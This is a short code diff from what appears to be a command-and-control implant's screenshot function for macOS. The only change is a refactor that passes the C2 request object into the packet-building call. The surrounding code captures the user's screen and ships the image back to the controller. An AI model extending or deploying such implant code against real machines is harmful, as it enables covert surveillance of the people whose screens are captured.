@@ -68,12 +68,12 @@ static tlv_pkt_t *ui_screenshot(c2_t *c2)
         if (CGImageDestinationFinalize(destination))
         {
             newImage = (__bridge NSData *)newImageData;
-            result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+            result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
             tlv_pkt_add_bytes(result, TLV_TYPE_BYTES, (unsigned char *)newImage.bytes, newImage.length);
         }
         else
         {
-            result = api_craft_tlv_pkt(API_CALL_FAIL);
+            result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
         }
     }
 
